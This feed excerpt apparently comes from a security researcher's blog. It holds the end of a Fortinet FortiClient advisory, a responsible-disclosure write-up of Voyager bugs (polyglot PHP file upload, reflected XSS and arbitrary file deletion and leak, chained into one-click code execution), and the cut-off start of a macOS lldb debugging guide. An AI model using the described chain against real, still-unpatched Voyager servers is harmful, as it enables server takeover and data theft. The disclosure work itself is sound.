discovered are fixed in the following versions:</p><ul><li>CVE-2025-25251: fixed in FortiClientMac 7.4.3 and 7.2.9. Fix is also being backported to 7.0.</li><li>CVE-2025-31365: fixed in FortiClientMac 7.4.4 and 7.2.9</li><li>CVE-2025-22855: fixed in FortiClient EMS 7.4.3</li><li>CVE-2025-22859: fixed in FortiClient EMS 7.4.3; only EMS 7.4 (Linux-based) is affected by this issue. </li><li>CVE-2025-31366: fixed in FortiOS and FortiProxy versions 7.6.3 and 7.4.8</li></ul><p>We urge customers to update their affected Fortinet products to the fixed versions.</p><h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><table><thead><tr><th>Date</th><th>Action</th></tr></thead><tbody><tr><td>2024-11-20</td><td>We report all issues to Fortinet</td></tr><tr><td>2024-11-29</td><td>Fortinet acknowledges the receipt of the report</td></tr><tr><td>2024-12-18</td><td>Fortinet confirms the issues are being worked on</td></tr><tr><td>2025-01-28</td><td>CVE-2025-22855 and CVE-2025-22859 are assigned</td></tr><tr><td>2025-03-05</td><td>CVE-2025-25251 is assigned</td></tr><tr><td>2025-03-28</td><td>CVE-2025-31366 and CVE-2025-31365 are assigned</td></tr><tr><td>2025-04-08</td><td>CVE-2025-22855 is published</td></tr><tr><td>2025-04-08</td><td>Fortinet shares the CVSS scoring with us</td></tr><tr><td>2025-04-08</td><td>We request further clarification about the scoring</td></tr><tr><td>2025-04-10</td><td>Fortinet shares further CVSS details with us</td></tr><tr><td>2025-04-11</td><td>We provide our feedback regarding the CVSS scoring</td></tr><tr><td>2025-05-13</td><td>CVE-2025-22859 and CVE-2025-25251 are published</td></tr></tbody></table><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>In this post, we’ve broken down a critical FortClient vulnerability that gives an attacker the power to execute arbitrary code with just a single click from the user. We also briefly mentioned how a compromised client could reconnect to the legitimate EMS server by leveraging a parameter stored in the localStorage, essentially turning a trusted client into a malicious one. </p><p>This sets the stage for our next article, where we’ll dive deeper into this attack path and explore what a malicious client can achieve once connected to the EMS.</p><p>We would like to thank the Fortinet PSIRT for their collaboration and responsiveness in addressing these findings.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Fortinet is one of the largest players in the cybersecurity industry, known for its extensive range of security solutions. Their portfoli</summary>
      
    
    
    
    
    <category term="Fortinet" scheme="https://yaniv-git.github.io/tags/Fortinet/"/>
    
    <category term="chain" scheme="https://yaniv-git.github.io/tags/chain/"/>
    
    <category term="v8" scheme="https://yaniv-git.github.io/tags/v8/"/>
    
    <category term="electron" scheme="https://yaniv-git.github.io/tags/electron/"/>
    
  </entry>
  
  <entry>
    <title>The Tainted Voyage: Uncovering Voyager&#39;s Vulnerabilities</title>
    <link href="https://yaniv-git.github.io/2025/01/26/The%20Tainted%20Voyage:%20Uncovering%20Voyager&#39;s%20Vulnerabilities/"/>
    <id>https://yaniv-git.github.io/2025/01/26/The%20Tainted%20Voyage:%20Uncovering%20Voyager&#39;s%20Vulnerabilities/</id>
    <published>2025-01-26T23:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.242Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://voyager.devdojo.com/" title="Voyager">Voyager</a> is a popular open-source PHP package designed to streamline the management of Laravel applications. It provides a pre-built, user-friendly admin interface and offers a range of features, such as BREAD operations, media management, user management, and more. With over 11,000 GitHub stars and millions of downloads, it has established itself as a reliable and widely-used solution in the Laravel community.</p><p>By leveraging SonarQube Cloud’s code analysis, which is free to use for open-source projects, we continuously and proactively identify and mitigate risks within open-source projects, benefiting both the community and our own tools. During one of many scans we performed, a Voyager finding caught our eye, which led us to a further audit of the project and eventually discover and disclose critical vulnerabilities in the project.</p><h1 id="Key-Information"><a href="#Key-Information" class="headerlink" title="Key Information"></a>Key Information</h1><ul><li>During our continuous scans, SonarQube Cloud <a href="https://sonarcloud.io/project/issues?issueStatuses=OPEN,CONFIRMED&types=VULNERABILITY&id=SonarSourceResearch_voyager-blogpost&open=AZNs69Z-Bb89eYtXmCnW" title="reported">reported</a> an arbitrary file write vulnerability in Voyager.</li><li>After further research of the project, we discovered additional vulnerabilities and combined them to create a realistic attack scenario, which resulted in one-click remote code execution on a Voyager instance.</li><li>We reported the findings to the project maintainers multiple times via emails and Github with no reply.</li><li>We release this information to the public in order to protect users, under our 90-day responsible disclosure policy.</li></ul><h1 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h1><p>When an authenticated Voyager user clicks on a malicious link, attackers can execute arbitrary code on the server. <strong>At the time of writing this blog (Voyager version 1.8.0), the vulnerabilities have not been fixed</strong> and we release this information to allow users to protect themselves under our 90-day responsible disclosure deadline.</p><iframe width="736" height="414" src="https://www.youtube.com/embed/qLCrPCXEcec" title="The Tainted Voyage: Uncovering Voyager&#39;s Vulnerabilities" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><h1 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h1><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>Let’s take a look at the report that caught our attention.</p><img src="/img/blogs/voyager/sonarqube.png" style="width: 100%;"/><p><em>Try it yourself on <em><a href="https://sonarcloud.io/project/issues?issueStatuses=OPEN,CONFIRMED&types=VULNERABILITY&id=SonarSourceResearch_voyager-blogpost&open=AZNs69Z-Bb89eYtXmCnW" title="see it yourself on SonarQube Cloud"><em>SonarQube Cloud</em></a></em>.</em></p><p>Initially, the issue appeared to be a straightforward path traversal vulnerability within the application’s media upload component. However, a deeper analysis revealed limitations an attacker would need to overcome in order to make this vulnerability impactful. Expanding the truncated part from the sink (user input) to the source (the dangerous <code>storeAs</code> function) shows interesting information:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Check permission</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">authorize</span>(<span class="string">&#x27;browse_media&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$extension</span> = <span class="variable">$request</span>-&gt;file-&gt;<span class="title function_ invoke__">getClientOriginalExtension</span>();</span><br><span class="line">    <span class="variable">$name</span> = <span class="title class_">Str</span>::<span class="title function_ invoke__">replaceLast</span>(<span class="string">&#x27;.&#x27;</span>.<span class="variable">$extension</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$request</span>-&gt;file-&gt;<span class="title function_ invoke__">getClientOriginalName</span>());</span><br><span class="line">    <span class="variable">$details</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;details&#x27;</span>) ?? <span class="string">&#x27;&#123;&#125;&#x27;</span>);</span><br><span class="line">    <span class="variable">$absolute_path</span> = <span class="title class_">Storage</span>::<span class="title function_ invoke__">disk</span>(<span class="variable">$this</span>-&gt;filesystem)-&gt;<span class="title function_ invoke__">path</span>(<span class="variable">$request</span>-&gt;upload_path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$realPath</span> = <span class="title class_">Storage</span>::<span class="title function_ invoke__">disk</span>(<span class="variable">$this</span>-&gt;filesystem)-&gt;<span class="title function_ invoke__">path</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$allowedMimeTypes</span> = <span class="title function_ invoke__">config</span>(<span class="string">&#x27;voyager.media.allowed_mimetypes&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$allowedMimeTypes</span> != <span class="string">&#x27;*&#x27;</span> &amp;&amp; (<span class="title function_ invoke__">is_array</span>(<span class="variable">$allowedMimeTypes</span>) &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$request</span>-&gt;file-&gt;<span class="title function_ invoke__">getMimeType</span>(), <span class="variable">$allowedMimeTypes</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="title function_ invoke__">__</span>(<span class="string">&#x27;voyager::generic.mimetype_not_allowed&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$request</span>-&gt;file-&gt;<span class="title function_ invoke__">storeAs</span>(<span class="variable">$request</span>-&gt;upload_path, <span class="variable">$name</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$extension</span>, <span class="variable">$this</span>-&gt;filesystem);</span><br></pre></td></tr></table></figure><p>There are two important checks here, which are performed before the file is saved to the disk. </p><ol><li>The first one verifies that the user who made the request has the <code>browse_media</code> permission, which means that no ordinary user can execute this action. </li><li>The second one verifies if the file’s <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/MIME_types" title="MIME type">MIME type</a> is allowed (predefined in the configuration).</li></ol><p>Can you think of ways an attacker would try to bypass these when crafting an exploit? We will deep-dive into each point using different vulnerabilities, starting with the second one, the mime-type verification.</p><h2 id="Arbitrary-File-Write-vulnerability-CVE-2024-55417"><a href="#Arbitrary-File-Write-vulnerability-CVE-2024-55417" class="headerlink" title="Arbitrary File Write vulnerability (CVE-2024-55417)"></a>Arbitrary File Write vulnerability (CVE-2024-55417)</h2><p>When a file is uploaded to the <code>/admin/media/upload</code> endpoint, Voyager <a href="https://github.com/thedevdojo/voyager/blob/1.7/src/Http/Controllers/VoyagerMediaController.php#L238" title="checks">checks</a> the request file’s MIME type via Laravel’s (which uses Symphony) <a href="https://laravel.com/api/master/Illuminate/Support/Facades/Request.html#method_getMimeType" title="getMimeType">getMimeType</a> function. In order to understand how it works, let’s take a look at a similar function’s <a href="https://github.com/symfony/symfony/blob/73d490466bdaf09fb5ee57ea55a91db40f8c6b03/src/Symfony/Component/HttpFoundation/File/UploadedFile.php#L126" title="documentation">documentation</a>, <code>getClientMimeType:</code></p><blockquote><p>The client mime type is extracted from the request from which the file was uploaded, so it should not be considered as a safe value. For a trusted mime type, use getMimeType() instead (which guesses the mime type based on the file content).</p></blockquote><p>When a user uploads a file (via form data), they provide a file name and content type in addition to the file’s content. While some functions get the type of the file from the name’s extension or the content type, getMimeType is supposed to be “safer” by <a href="https://en.wikipedia.org/wiki/Content_sniffing" title="sniffing">sniffing</a>&#x2F;guessing it from the content itself.</p><p>After sniffing the MIME type, the <a href="https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerMediaController.php#L238" title="VoyagerMediaController@upload">VoyagerMediaController@upload</a> function crosses it with a predefined list and <a href="https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerMediaController.php#L239" title="throws an exception">throws an exception</a> when not allowed.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$allowedMimeTypes</span> != <span class="string">&#x27;*&#x27;</span> &amp;&amp; (<span class="title function_ invoke__">is_array</span>(<span class="variable">$allowedMimeTypes</span>) &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$request</span>-&gt;file-&gt;<span class="title function_ invoke__">getMimeType</span>(), <span class="variable">$allowedMimeTypes</span>))) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="title function_ invoke__">__</span>(<span class="string">&#x27;voyager::generic.mimetype_not_allowed&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <a href="https://github.com/thedevdojo/voyager/blob/873bce194e3066b89ac2e46d6063179b35c6f52d/publishable/config/voyager.php#L227-L233" title="default">default</a> <code>allowedMimeTypes</code> list contains harmless content types:</p><ul><li>image&#x2F;jpeg</li><li>image&#x2F;png</li><li>image&#x2F;gif</li><li>image&#x2F;bmp</li><li>video&#x2F;mp4</li></ul><p>But file formats can be complicated. While some types of files have a clear and strict structure, others might be less obvious. For example, a PHP-based file doesn’t require to start with a specific order of bytes (<a href="https://en.wikipedia.org/wiki/List_of_file_signatures" title="file header">file header</a>) to be valid. Consequently, if a file contains the PHP opening tag <code>&lt;?php</code> anywhere within its content, the embedded PHP code can be executed by a PHP interpreter.</p><p>Therefore, if an attacker can manipulate the content type sniffing mechanism to classify a malicious file as an allowed file type and subsequently induce the server to process it as a PHP script, this arbitrary file write vulnerability could be escalated into a critical remote code execution by uploading a web shell.</p><h3 id="Introducing-Polyglot-Files-A-Double-Edged-Sword"><a href="#Introducing-Polyglot-Files-A-Double-Edged-Sword" class="headerlink" title="Introducing Polyglot Files: A Double-Edged Sword"></a>Introducing Polyglot Files: A Double-Edged Sword</h3><p><a href="https://en.wikipedia.org/wiki/Polyglot_(disambiguation)" title="Polyglot">Polyglot</a> files are files that can be interpreted as multiple file types, taking advantage of the flexibility and variety of file formats. While this flexibility can be beneficial in some cases, it can also be exploited by malicious actors.</p><p>In the context of this vulnerability, an attacker could craft a polyglot file that appears to be a legitimate file type to the <code>getMimeType</code> function (e.g., an image or video) but actually contains malicious PHP code.<br>However, in order for the malicious code to be executed, the server should serve and render the file as PHP, which is determined by the extension. Since the upload mechanism doesn’t implement any file extension verification, an attacker can simply decide on an arbitrary extension. Resulting in arbitrary code execution by users who have the <code>browse_media</code> permissions.</p><img src="/img/blogs/voyager/webshell.png" style="width: 100%;"/><h2 id="Reflected-Cross-Site-Scripting-CVE-2024-55416"><a href="#Reflected-Cross-Site-Scripting-CVE-2024-55416" class="headerlink" title="Reflected Cross-Site Scripting (CVE-2024-55416)"></a>Reflected Cross-Site Scripting (CVE-2024-55416)</h2><p>While the arbitrary file upload vulnerability, coupled with PHP’s permissive nature, could lead to remote code execution, its impact is currently limited by the <code>browse_media</code> permission requirement. As Voyager is primarily targeted at administrators, this limitation reduces the immediate severity of the issue. The main concern lies in the potential for unauthorized code execution within the administrative context. While this might be a significant issue for some applications, it’s less critical in scenarios where all administrators are trusted.</p><p>To escalate this vulnerability to a critical threat, an attacker would need to combine it with another vulnerability, such as authorization bypass, cross-site request forgery (CSRF), or cross-site scripting (XSS) attack, to execute malicious code on behalf of a privileged user.</p><p>When auditing the rest of the Voyager codebase we noticed an interesting endpoint: the <code>/admin/compass</code> which gets handled by the <a href="https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerCompassController.php#L19" title="VoyagerCompassController@index">VoyagerCompassController@index</a> component, allowing the execution of certain actions via a GET request. Despite it still requiring admin permissions when handling GET requests, an attacker can craft a URL and manipulate an authenticated user to invoke the request by clicking on the link.</p><p>One of the actions that this endpoint provides is <a href="https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerCompassController.php#L44" title="deleting a file">deleting a file</a>. After the action is done (regardless of whether the file is found or deleted), a small popup will be displayed to the user in the UI.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">has</span>(<span class="string">&#x27;del&#x27;</span>)) &#123;</span><br><span class="line">  <span class="variable">$active_tab</span> = <span class="string">&#x27;logs&#x27;</span>;</span><br><span class="line">  <span class="title function_ invoke__">app</span>(<span class="string">&#x27;files&#x27;</span>)-&gt;<span class="title function_ invoke__">delete</span>(<span class="title class_">LogViewer</span>::<span class="title function_ invoke__">pathToLogFile</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">input</span>(<span class="string">&#x27;del&#x27;</span>))));</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="variable">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">url</span>().<span class="string">&#x27;?logs=true&#x27;</span>)-&gt;<span class="title function_ invoke__">with</span>([</span><br><span class="line">    <span class="string">&#x27;message&#x27;</span>    =&gt; <span class="title function_ invoke__">__</span>(<span class="string">&#x27;voyager::compass.logs.delete_success&#x27;</span>).<span class="string">&#x27; &#x27;</span>.<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">input</span>(<span class="string">&#x27;del&#x27;</span>)),</span><br><span class="line">    <span class="string">&#x27;alert-type&#x27;</span> =&gt; <span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">  ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The issue here is that when Voyager <a href="https://github.com/thedevdojo/voyager/blob/1.6/resources/assets/js/helpers.js#L52" title="renders the popup">renders the popup</a> message, it contains the provided file name unsanitized:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">notify</span>(<span class="params">type, message</span>) </span>&#123;</span><br><span class="line">  let alert = <span class="string">&#x27;&lt;div class=&quot;alert alert-&#x27;</span>  + type +  dismissibleClass + <span class="string">&#x27;&quot; role=&quot;alert&quot;&gt;&#x27;</span>  + dismissButton + message +  <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">  $(options.alertsContainer).<span class="title function_ invoke__">append</span>(alert);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>This means that if an authenticated user clicks on a specially crafted link, arbitrary JavaScript code can be executed. As a result, an attacker can perform any subsequent action in the context of the victim. Combining it with the previous finding an attacker can escalate it to execute arbitrary code on the server </p><img src="/img/blogs/voyager/xss.png" style="width: 100%;"/><h2 id="Arbitrary-File-Leak-and-Deletion-CVE-2024-55415"><a href="#Arbitrary-File-Leak-and-Deletion-CVE-2024-55415" class="headerlink" title="Arbitrary File Leak and Deletion (CVE-2024-55415)"></a>Arbitrary File Leak and Deletion (CVE-2024-55415)</h2><p>If an attacker wants to be more stealthy and just steal or delete files without having to drop a malicious PHP file on disk, they could use the same endpoint to do so.</p><p>The user-provided path is sent to the <a href="https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerCompassController.php#L213" title="​​pathToLogFile">​pathToLogFile</a> function, but looking at the code, there isn’t any normalization or modification of the input. The function only checks that the file exists:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">pathToLogFile</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$logsPath</span> = <span class="title function_ invoke__">storage_path</span>(<span class="string">&#x27;logs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">app</span>(<span class="string">&#x27;files&#x27;</span>)-&gt;<span class="title function_ invoke__">exists</span>(<span class="variable">$file</span>)) &#123; <span class="comment">// try the absolute path</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$logsPath</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// check if requested file is really in the logs directory</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">dirname</span>(<span class="variable">$file</span>) !== <span class="variable">$logsPath</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&#x27;No such log file&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>An attacker can initiate the deletion of arbitrary files by tricking a user into clicking a malicious link. As discussed in the previous finding, this vulnerability is triggered before sending the unsanitized message to the user.<br>Arbitrary file deletion can have a severe impact on an application. The obvious one is impacting the availability of the server, but in some cases, we have seen <a href="https://www.sonarsource.com/blog/wordpress-file-delete-to-code-execution/" title="unique ways">unique ways</a> attackers used arbitrary file deletion to gain code execution (via configuration deletion, installation, etc)</p><p>Additionally, the <code>/admin/compass</code> endpoint is responsible for downloading a file. In this case, it doesn’t directly expose sensitive information to the attacker because the file will be downloaded to the victim’s machine. However, the previous XSS can be leveraged to get the content of the file via Javascript, and then send it to the attacker’s controlled server.</p><h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><p>At this time, no patches are available to address the vulnerabilities we’ve identified. Despite multiple attempts to contact the project maintainers via email and GitHub, we have not received a response.</p><p>In accordance with our responsible disclosure policy, we are publicly releasing the details of our findings after 90 days. We believe this allows users of Voyage to make informed decisions about their use of Voyage.</p><p>We strongly advise users to carefully consider using this project in their applications and exercise caution when deciding to do so.</p><h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><table><thead><tr><th>Date</th><th>Action</th></tr></thead><tbody><tr><td>2024-09-11</td><td>We report all issues to the maintainers.</td></tr><tr><td>2024-10-20</td><td>We ping the maintainers.</td></tr><tr><td>2024-11-11</td><td>We ping the maintainers mentioning that 60 days have passed.</td></tr><tr><td>2024-11-28</td><td>We open a security report via GitHubWe open a security report via GitHub.</td></tr><tr><td>2024-12-11</td><td>We notify the maintainers that the 90-day disclosure window has elapsed and that we are planning to release the details to the public.</td></tr><tr><td>2025-01-27</td><td>We release this blog post.</td></tr></tbody></table><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>In this blog post, we delved into a security vulnerability uncovered by SonarQube Cloud within the Voyager project. We highlighted how attackers can leverage this vulnerability in conjunction with other security weaknesses to execute malicious code on vulnerable systems. By leveraging SonarQube Cloud’s advanced code analysis capabilities, organizations can proactively identify and address security vulnerabilities, such as those demonstrated in this post, before they reach production.</p><p>Unfortunately, despite our best efforts, we were unable to reach the maintainers to address these vulnerabilities. We hope that by sharing this information, we can raise awareness among Voyager users regarding the project’s security aspect.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://voyager.devdojo.com/&quot; title=&quot;Voyager&quot;&gt;Voyager&lt;/a&gt; is a popular open-source PHP package designed to streamline the manage</summary>
      
    
    
    
    
    <category term="rce" scheme="https://yaniv-git.github.io/tags/rce/"/>
    
    <category term="xss" scheme="https://yaniv-git.github.io/tags/xss/"/>
    
    <category term="polyglot" scheme="https://yaniv-git.github.io/tags/polyglot/"/>
    
    <category term="file-upload" scheme="https://yaniv-git.github.io/tags/file-upload/"/>
    
  </entry>
  
  <entry>
    <title>MacOS Binary Debugging</title>
    <link href="https://yaniv-git.github.io/2025/01/11/MacOS%20Binary%20Debugging/"/>
    <id>https://yaniv-git.github.io/2025/01/11/MacOS%20Binary%20Debugging/</id>
    <published>2025-01-11T23:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.240Z</updated>
    
    <content type="html"><![CDATA[<img src="/img/blogs/macos-debugging/image1.png" style="display: block;  margin-left: auto;  margin-right: auto; width: 25%;"/><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Dynamic reverse engineering and binary debugging involve analyzing the behavior of a running program to understand its functionality and&#x2F;or identify potential vulnerabilities. This technique is often used for malware analysis, security research, and software testing. If you ever had the chance to dynamically reverse engineer, you most likely used <a href="https://www.sourceware.org/gdb/">GDB</a> as the debugger. But ever since 2007, Apple shifted gradually from GCC to Clang, with it becoming the default compiler in Xcode 4.0 released in 2011.<br>This means we will need to use <a href="https://lldb.llvm.org/">lldb</a> for debugging. Fortunately, the differences in user experience aren’t big.</p><h2 id="lldb-Setup"><a href="#lldb-Setup" class="headerlink" title="lldb Setup"></a>lldb Setup</h2><p>Installing <code>lldb</code> could have not been easier, simply open the terminal and write <code>lldb</code>, if it’s not installed you will be prompted with the installation window.</p><img src="/img/blogs/macos-debugging/image2.jpg" style="width: 100%;"/><p>After installation, if we try to run <code>lldb</code> and attach it to a running process (or execute a binary via <code>process launch</code>) we will probably face with the following error:</p><img src="/img/blogs/macos-debugging/image3.png" style="width: 100%;"/><blockquote><p><em>error: attach failed: attach failed (Not allowed to attach to process.  Look in the console messages (Console.app), near the debugserver entries, when the attach failed.  The subsystem that denied the attach permission will likely have logged an informative message about why it was denied.)</em></p></blockquote><h1 id="OSX-Protections"><a href="#OSX-Protections" class="headerlink" title="OSX Protections"></a>OSX Protections</h1><p>Debugging applications on macOS can be more complex than on other operating systems due to the stringent security measures <a href="https://developer.apple.com/documentation/security?language=objc">implemented</a> by Apple. Mechanisms such as <a href="https://developer.apple.com/documentation/security/hardened-runtime?language=objc">Harden Runtime</a>, <a href="https://support.apple.com/en-us/102149">System Integrity Protection</a> (SIP), and <a href="https://support.apple.com/en-gb/guide/security/sec5599b66df/web">Gatekeeper</a>, are designed to safeguard user privacy and system integrity but often restrict necessary access for researchers. </p><p>One important tip that can help us troubleshoot issues throughout our setup process is the use of the <code>console</code> app. It provides a centralized interface to view system logs, application logs, and other diagnostic information. By analyzing these logs, we can pinpoint which mechanism blocks us and seek a relevant solution.</p><img src="/img/blogs/macos-debugging/image4.png" style="display: block;  margin-left: auto;  margin-right: auto; width: 15%;"/><p>So let’s try to attach via <code>lldb</code> again and take a look at the console.</p><img src="/img/blogs/macos-debugging/image5.png" style="width: 100%;"/><p>Due to Harden Runtime, an application in MacOS has to grant permissions in order for debuggers to attach to their processes. These permissions are done via <a href="https://developer.apple.com/documentation/bundleresources/entitlements?language=objc">entitlement</a> in the code signature. In our specific case, <code>get-task-allow</code> entitlement is missing.</p><p>But as researchers, we usually debug built applications that are already signed with certain permissions. Can we change them?</p><h1 id="Self-Signing-Binaries-to-Grant-Permissions"><a href="#Self-Signing-Binaries-to-Grant-Permissions" class="headerlink" title="Self-Signing Binaries to Grant Permissions"></a>Self-Signing Binaries to Grant Permissions</h1><p>We can <a href="https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html">resign</a>, with extra permissions, the specific binary we would like to debug. However, as I will explain later in the blog, it might cause some other problems in the future. But, for now, let’s see how we can resign executables.</p><p>First, here is how we can see a file’s current signature: Form the Authority, TeamIdentifier, to the actual (XML formatted) entitlements.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codesign -d -vvv --entitlements :- &lt;path_to_file&gt;</span><br></pre></td></tr></table></figure><p>We can take the XML text of the entitlements and write it to a file adding our <code>get-task-allow</code> permission, e.g:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">plist</span></span></span><br><span class="line"><span class="meta">  <span class="keyword">PUBLIC</span> <span class="string">&#x27;-//Apple//DTD PLIST 1.0//EN&#x27;</span></span></span><br><span class="line"><span class="meta">  <span class="string">&#x27;https://www.apple.com/DTDs/PropertyList-1.0.dtd&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.security.cs.allow-jit<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.security.cs.allow-unsigned-executable-memory<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.security.get-task-allow<span class="tag">&lt;/<span 